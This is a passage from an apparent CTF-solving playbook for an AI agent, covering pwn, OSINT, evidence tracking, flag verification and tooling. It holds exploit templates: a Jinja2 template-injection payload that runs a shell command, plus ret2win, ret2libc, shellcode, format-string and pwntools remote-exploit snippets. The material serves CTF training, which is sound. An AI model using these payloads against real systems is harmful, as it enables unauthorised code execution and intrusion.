# {{7*7}} -> 49 suggests Jinja2/Twig
# ${7*7} -> 49 suggests Freemarker
# #{7*7} -> 49 suggests Ruby/SST
curl -s "http://target:port/?name={{7*7}}" | grep -o '49'

# Jinja2 RCE payload probe
# curl -s "http://target:port/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
```

---

## Phase 7: Binary Exploitation / Pwn

**Only for pwn challenges — ELF/PE binaries with a remote service.**

### 7A — Binary Analysis

```bash
# Security check (REQUIRED before any exploit)
python3 -c "
from pwn import *
e = ELF('./binary')
sec = e.checksec()
for k, v in sec.items():
    print(f'{k}: {v}')
"

# Read addresses
python3 -c "
from pwn import *
e = ELF('./binary')
print(f'Entry: {hex(e.entry)}')
print(f'PIE base: {hex(e.address)}')
print(f'PLT functions:')
for name, addr in sorted(e.plt.items(), key=lambda x: x[1]):
    print(f'  {name}: {hex(addr)}')
print(f'GOT entries:')
for name, addr in sorted(e.got.items(), key=lambda x: x[1]):
    print(f'  {name}: {hex(addr)}')
"
```

### 7B — Vulnerability Identification

```bash
# Buffer overflow — look for gets, scanf, strcpy, read with fixed size
objdump -d binary -M intel | grep -E '(gets@plt|scanf@plt|strcpy@plt|sprintf@plt|read@plt)'

# Format string — look for printf with user input
objdump -d binary -M intel | grep -B 5 'printf@plt'

# Check for win/flag/backdoor functions
nm binary 2>/dev/null | grep -iE '(win|flag|shell|admin|backdoor|hint)'
objdump -t binary 2>/dev/null | grep -iE '(win|flag|shell|admin|backdoor)'
```

### 7C — Exploit Templates

```bash
# Ret2win (simplest: overflow + return to win function)
python3 -c "
from pwn import *
e = ELF('./binary')
win_addr = e.symbols.get('win') or e.symbols.get('flag') or e.symbols.get('shell')
print(f'Win address: {hex(win_addr) if win_addr else \"NOT FOUND\"}')
offset = 40  # Adjust after analysis
print(f'Exploit: A*{offset} + p64(win_addr)')
"

# Ret2libc (NX enabled, no win function)
# python3 -c "
# from pwn import *
# e = ELF('./binary')
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# # Leak puts@GOT, compute libc base
# puts_plt = e.plt['puts']
# puts_got = e.got['puts']
# main_addr = e.symbols['main']
# pop_rdi = 0x...  # Find with ROPgadget
# print(f'puts@plt: {hex(puts_plt)}')
# print(f'puts@got: {hex(puts_got)}')
# print(f'main: {hex(main_addr)}')
# print(f'pop_rdi: {hex(pop_rdi)}')
# "

# Ret2shellcode (NX disabled)
# python3 -c "
# from pwn import *
# shellcode = asm(shellcraft.sh())
# print(f'Shellcode ({len(shellcode)} bytes): {shellcode.hex()}')
# "
```

### 7D — Format String Exploitation

```bash
# Leak stack values
# python3 -c "
# from pwn import *
# # Probe: %p.%p.%p.%p.%p.%p.%p.%p
# # This leaks stack pointers — look for return addresses, canaries, libc addresses
# "

# Write arbitrary memory with %n
# python3 -c "
# # Format: <target_addr> + %<value>c%<offset>\$n
# # pwntools automates this with fmtstr_payload()
# from pwn import *
# payload = fmtstr_payload(offset, {target_addr: value})
# print(f'Format string payload ({len(payload)} bytes)')
# "
```

### 7E — Pwntools Interaction

```bash
# Local test
# python3 -c "
# from pwn import *
# p = process('./binary')
# p.sendline(b'A' * 40 + p64(0x401234))
# p.interactive()
# "

# Remote exploit
# python3 -c "
# from pwn import *
# p = remote('target', port)
# p.sendline(exploit_payload)
# p.interactive()
# "

# GDB attach
# python3 -c "
# from pwn import *
# p = gdb.debug('./binary', 'break main\ncontinue')
# p.sendline(b'test')
# print(p.recvall())
# "
```

---

## Phase 8: OSINT

**For challenges involving public-source investigation, usernames, domains, or image provenance.**

### 8A — Metadata for OSINT

```bash
# Full EXIF — GPS coordinates, camera model, software, timestamps
exiftool image.jpg 2>/dev/null

# GPS extraction
python3 -c "
from PIL import Image
from PIL.ExifTags import TAGS, GPSTAGS
img = Image.open('image.jpg')
exif = img._getexif()
if exif:
    for tag_id, value in exif.items():
        tag = TAGS.get(tag_id, tag_id)
        if tag == 'GPSInfo':
            for gps_tag, gps_val in value.items():
                gps_name = GPSTAGS.get(gps_tag, gps_tag)
                print(f'GPS {gps_name}: {gps_val}')
        else:
            print(f'{tag}: {value}')
"
```

### 8B — Username & Domain Investigation

```bash
# Search for usernames in strings
strings * | grep -iE '@' | head -20
strings * | grep -iE '(twitter|github|linkedin|discord|reddit)' | head -20

# Domain extraction
strings * | grep -oE '[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u | head -20

# Check if domains are real
# for domain in $(strings * | grep -oE '[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u); do
#   host "$domain" 2>/dev/null && echo "Resolves: $domain"
# done
```

### 8C — Image Investigation

```bash
# Reverse image search (via API or browser)
# Use web_search or browser to search by image content
# Try: 'search for similar images' + description of visible features

# Check if image is a screenshot of something recognisable
python3 -c "
from PIL import Image
img = Image.open('image.png')
print(f'Size: {img.size}')
print(f'Mode: {img.mode}')
# Crop specific regions if known
# crop = img.crop((x1, y1, x2, y2))
# crop.save('/tmp/region.png')
"
```

### 8D — Public-Source Correlation

```bash
# Check social media profiles for hints
# Use browser or web_search with discovered usernames

# Wayback Machine for historical content
# curl -s 'http://web.archive.org/cdx/search/cdx?url=target.com&output=text' | head -20

# crt.sh for certificate transparency (subdomains)
# curl -s 'https://crt.sh/?q=%.target.com&output=json' 2>/dev/null | python3 -m json.tool | head -40
```

---

## Phase 9: Investigation Record & Solver Strategy

**This is not a phase — it's a continuous practice throughout the solve.**

### 9A — Evidence Chain

Maintain a running investigation record. The goal is to avoid re-running tools and to connect clues across categories.

```bash
echo "=== Phase: [current] ===" >> /home/kali/observations.txt
echo "Tools used: file, exiftool, strings" >> /home/kali/observations.txt
echo "Findings: Found base64 string in metadata comment" >> /home/kali/observations.txt
echo "Hypothesis: Decoding this may reveal a URL" >> /home/kali/observations.txt
```

Or use Hermes' `todo` tool for state tracking:
```
id: recon-phase1, content: "Phase 1 — static recon on all files", status: completed
id: findings-stego, content: "Found appended zip in PNG — extracted", status: completed
id: findings-crypto, content: "Found base64 in extracted file — decoded to URL", status: completed
id: findings-web, content: "URL leads to pastebin with encoded string — decode", status: in_progress
```

### 9B — Decision-Making Rules

**Before EVERY tool call, ask:**

1. **What evidence do I have right now?** (not what I expect to find)
2. **What's the cheapest check that could validate or refute my current hypothesis?**
3. **Does this tool have a reasonable chance of producing evidence?**

**Escalation ladder per category:**

| Level | Forensics | Stego | Crypto | RE | Web | Pwn |
|-------|-----------|-------|--------|----|-----|-----|
| Basic | strings, file, exiftool | zsteg | encoding ID | strings, nm | curl, headers | checksec |
| Interm | binwalk, foremost | steghide, channels | classic ciphers | objdump, readelf | dirbust, param | GDB overflow |
| Adv | volatility, testdisk | spectrogram, QR | RSA, freq analysis | Ghidra, radare2 | SQLmap, JWT | ROP, format str |

- **Never skip levels.** If basic level returned nothing, try intermediate. Only go advanced if intermediate produced findings.
- **Kill unproductive branches.** If a technique produces no new evidence after 2 attempts, abandon it. Do not retry identical commands.
- **Hypothesis-driven.** "I think this is base64" → test. "I think there's appended data" → check. "I think the flag is in this image" → LSB. Each command should test exactly one hypothesis.

### 9C — Speed & Token Efficiency

| Do | Don't |
|----|-------|
| Batch independent commands | Run one tool at a time |
| `file *` — one call for all files | `file a; file b; file c` — per-file calls |
| Read output carefully before acting | Re-run hoping for different results |
| Copy before extraction | Modify originals |
| `python3 -c "..."` for custom analysis | Heavy tools where simple logic suffices |
| Kill dead-end branches immediately | Keep trying the same approach |
| Use zsteg/steghide only when evidence suggests stego | Run all stego tools on every file |

---

## Phase 10: Flag Verification

**Do NOT claim a flag without a complete, reproducible evidence path.**

### 10A — Detection & Validation

```bash
# Verify flag format
echo -n "candidate_flag" | grep -qE '^(flag|CTF|FLAG|KLD)\{.*\}$' && echo "Format OK"
# Or custom format: grep -qE 'pattern'

# Verify exact content (no trailing whitespace/newline)
echo -n "candidate_flag" | xxd

# Check if it's the actual flag or intermediate encoding
echo -n "candidate_flag" | base64 -d 2>/dev/null && echo " — Is base64, decode first"
```

### 10B — Verification Checklist

1. **Format check** — Does it match the expected flag format exactly?
2. **Evidence trace** — Can every character be derived from challenge data?
3. **Completeness** — Is this the full flag or just a fragment/piece?
4. **Reproducibility** — Would the same method always produce this flag?
5. **Decoding chain** — Did I fully decode? If it still looks encoded, keep going.

### 10C — Partial vs Complete Flag

- `ZmxhZ3t...` → still base64 (decode more)
- `flag{...` → truncated (dig deeper)
- `flag{abc123_def456}` → complete (verify with evidence)

**If the flag doesn't match the expected format, it's likely partial or still encoded. Keep digging.**

### 10D — Final Reporting

When reporting the flag:
1. State the full flag exactly.
2. Summarise the evidence chain in 1-2 sentences.
3. Name the key tool or technique that revealed it.
4. Never report a guessed or partial flag.

---

## Phase 11: Cross-Category Reasoning

**A challenge may combine multiple techniques. Move between categories when evidence indicates another category is involved.**

### Pivot Rules

| Evidence | Pivot To |
|----------|----------|
| Base64 string in image metadata | Crypto (decode) → may reveal Web URL or file |
| Deleted ZIP carved from disk image | Forensics → extract → may contain binary |
| Encrypted string in binary | RE → find XOR key → Crypto → decrypt |
| URL found in EXIF comment | Web → visit endpoint → may need API call |
| Hash found in PCAP DNS query | Network → Crypto → identify/crack hash |
| JPEG with unusual metadata | Stego → inspect channels → LSB extraction |
| Audio with spikes | Stego → spectrogram → visual flag text |
| Strings referencing a URL | OSINT → visit page → may have more data |
| No result after 3 attempts in current category | Pivot to a different category immediately |

### Detection Pattern: "This might be another category"

Watch for these signals:
- **Readable English that isn't a flag** → may be a hint to another category
- **Numbers that look like IPs/ports** → network pivot
- **Strings resembling URLs** → web pivot  
- **High-entropy blocks** → crypto (encrypted) or binary
- **Repeating byte patterns** → XOR key steganography
- **Timestamps** → timeline analysis, sequence correlation

### Multi-Layer Decoding Workflow

```bash
# Common multi-layer pattern: base64 → XOR → text
# When base64 decoded output looks like high-entropy binary:
python3 -c "
import base64
# Layer 1: base64 decode
with open('encoded.txt') as f:
    layer1 = base64.b64decode(f.read().strip())
# Layer 2: XOR brute
for key in range(256):
    layer2 = bytes(b ^ key for b in layer1)
    if b'flag' in layer2.lower():
        print(f'XOR key 0x{key:02x}: {layer2}')
    # Layer 3: still hex?
    if all(32 <= b < 127 for b in layer2):
        text = layer2.decode()
        try:
            layer3 = bytes.fromhex(text.strip())
            if b'flag' in layer3.lower():
                print(f'Hex decoded: {layer3}')
        except: pass
"
```

### When to Pivot vs When to Deepen

| Situation | Action |
|-----------|--------|
| Current approach produced NO new clues after 2 attempts | Pivot to another category |
| Current approach produced PARTIAL data (half a flag) | Deepen — try more tools in same category |
| Current approach found something that looks like it belongs to another category | Pivot to that category |
| All categories exhausted | Review evidence chain — look for missed connections |
| Total stall after all categories | Reread challenge description — missed a clue |

---

## Tool Quick Reference

| Tool | Primary Use Case | File Types |
|------|------------------|------------|
| `file` | Identify actual file type | All |
| `exiftool` | Extract metadata | Images, PDF, audio |
| `strings` | Extract readable text | All binaries |
| `binwalk` | Find embedded files | Images, firmware |
| `foremost` / `scalpel` | File carving / deleted recovery | Raw images, disk dumps |
| `volatility` | Memory forensics | .mem, .raw, .vmem |
| `zsteg` | LSB steganography | PNG, BMP |
| `steghide` | Steganography extract | JPG, WAV |
| `sox` / `ffmpeg` | Spectrogram generation | WAV, MP3, FLAC |
| `pyzbar` / `zbarimg` | QR / barcode decode | Images |
| `pdftotext` / `pdfinfo` / `pdfdetach` | PDF text/metadata/attachments | PDF |
| `tshark` / `tcpdump` | PCAP analysis | pcap/pcapng |
| `objdump` / `readelf` / `nm` | Binary static analysis | ELF/PE/Mach-O |
| `gdb` / `pwndbg` | Binary dynamic analysis | ELF/PE |
| `pwntools` | Exploit dev, binary interaction | ELF/PE |
| `radare2` / `r2` | Advanced reverse engineering | ELF/PE/Mach-O |
| `ghidra` (headless) | Deep RE / decompilation | ELF/PE/Mach-O |
| `ROPgadget` | ROP chain gadget finder | ELF/PE |
| `curl` | Web interaction | HTTP endpoints |
| `gobuster` / `ffuf` | Directory/parameter discovery | Web |
| `sqlmap` | Automated SQL injection | Web |
| `hashid` / `hash-identifier` | Hash type identification | Hash strings |
| `john` / `hashcat` | Hash cracking | Password hashes |
| `python3` + PIL / numpy / crypto | Custom analysis / decoding | All |
| `host` / `dig` / `nslookup` | DNS investigation | Domains |
| `waybackpy` / `crt.sh` | Historical/OSINT investigation | URLs, domains |